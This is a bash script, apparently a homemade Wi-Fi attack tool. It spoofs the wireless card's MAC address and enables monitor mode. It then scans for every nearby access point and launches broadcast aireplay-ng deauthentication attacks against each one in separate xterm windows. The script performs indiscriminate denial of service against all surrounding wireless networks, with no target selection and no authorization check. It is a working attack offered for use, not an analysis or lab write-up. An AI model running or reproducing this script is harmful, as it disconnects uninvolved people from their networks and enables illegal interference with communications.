#!/bin/bash

# Colors
end_color="$(tput sgr0)"
red_color="$(tput setaf 1)"
yellow_color="$(tput setaf 3)"
blue_color="$(tput setaf 4)"
green_color="$(tput setaf 2)"
purple_color="$(tput setaf 5)"
turquoise_color="$(tput setaf 6)"

# Network Interface
interface=$(iw dev | awk '$1=="Interface"{print $2}')

# Colors functions
error_m () {
  echo -e "\n[${red_color}*${end_color}] $1"
  exit 0
}

warning_m () {
  echo -ne "[${yellow_color}*${end_color}] $1"
}

working_m () {
  echo -e "[${blue_color}*${end_color}] $1"
}

ready_m () {
  echo -e "\n[${green_color}*${end_color}] $1"
}

print_title_message (){
 echo -en "[${purple_color}*${end_color}] ${turquoise_color}$1${end_color}" 
}

# Exit Manage
trap ctrl_c INT
ctrl_c () {
  for xterm in "${xterms_PID[@]}"; do
    kill -9 $xterm 1>&1 2>/dev/null
  done
  resetInterface
	exit 0
}

isMonitorMode() {
  iw dev | grep monitor >/dev/null
  if [[ "$?" -ne 0 ]]; then
    return 1
  fi
}

resetInterface () {
  echo -e "\n"
  print_title_message "Resseting Network\n\n"

  working_m "Setting Managed Interface"
  ip link set $interface down && iw $interface set type managed
  if [[ "$?" -ne 0 ]]; then
    error_m "Failed to set managed interface"
  fi

  working_m "Restarting Network Services"
  network_services=(wpa_supplicant.service NetworkManager.service dhcpcd.service)
  for service in "${network_services[@]}"; do
    systemctl restart $service 2>/dev/null
    if [[ "$?" -ne 0 ]]; then
      warning_m "Failed to restart $service\n"
    fi    
  done

  working_m "Set default MAC\n"
  macchanger -p $interface 
  ip link set $interface up

  ready_m "Done!"
}

startAttack () {

  working_m "Getting Networks"

  rm temp*
  airodump-ng $interface -w temp &
  a_ng_PID=$!
  sleep 5
  kill -9 $a_ng_PID >/dev/null && clear && ready_m "Networks Saved\n" 1>&2 2 # TODO: no verbose output
  bssid_list=($(awk -F ';' '/:/ && !/Network/ {print $4}' temp-01.kismet.csv))
  bssid_ch_list=($(awk -F ';' '/:/ && !/Network/ {print $6}' temp-01.kismet.csv))
  rm temp*

  pos=0
  xterms_PID=()
  channels=()
  for bssid in "${bssid_list[@]}"; do 
    channel="${bssid_ch_list[$pos]}"
    channels+=("$channel ")
    working_m $bssid
    
    iw dev "$interface" interface add "mon$channel" type monitor >/dev/null
    ifconfig "mon$channel" up
    iwconfig "mon$channel" channel "$channel"

    x=$((pos*50))
    y=$((pos*25))
    xterm -fg red -bg black -hold -geometry 90x32+$x+$y -e "aireplay-ng -0 10 -c FF:FF:FF:FF:FF:FF -a $bssid 'mon$channel' \
      && echo 'Done!' &" &
    xterms_PID+="$! "
    pos=$((pos+1))
  done

  # TODO: Deleting channel interfaces
  #for ch in "${channels[@]}"; do
  # ifconfig "mon$ch" down && iw dev "mon$ch" del
  # ready_m "mon$ch"
  #one

  # resetNet -i $interface

  sleep 20
}

setMonitorMode () {
  print_title_message "Setting Monitor Mode...\n"
  # Mac Address
  ifconfig "$interface" down && macchanger -a "$interface" >/dev/null
  ifconfig "$interface" up

  iw dev | grep monitor >/dev/null
  if [[ "$?" -ne 0 ]]; then
    print_title_message "Setting up environment...\n"
    # Monitor Mode
    if ! airmon-ng check kill >/dev/null; then
      error_m "Failed to kill conflicting processes"
    fi
    airmon-ng start "$interface" >/dev/null

    iw dev | grep monitor >/dev/null
    if [[ "$?" -ne 0 ]]; then
      error_m "Can't set Monitor Mode"
    fi

  fi

  # Show new configurations
  echo -e "${yellow_color}"
  iw dev
  echo
  macchanger -s "$interface"
  echo -e "${end_color}"
  sleep 2
}

checkDependencies () {
  clear
  dependencies=(aircrack-ng macchanger xterm)

  print_title_message "Checking dependencies...\n"

  for program in "${dependencies[@]}"; do
    if [ -x "$(command -v $program)" ]; then
      ready_m "$program"
    else
      error_m "Please install $program"
    fi
    sleep 1
  done
  clear
}

if [ "$(id -u)" == "0" ]; then
  clear
  checkDependencies
  setMonitorMode
  startAttack
  ctrl_c
else
  warning_m "Run as root"
fi
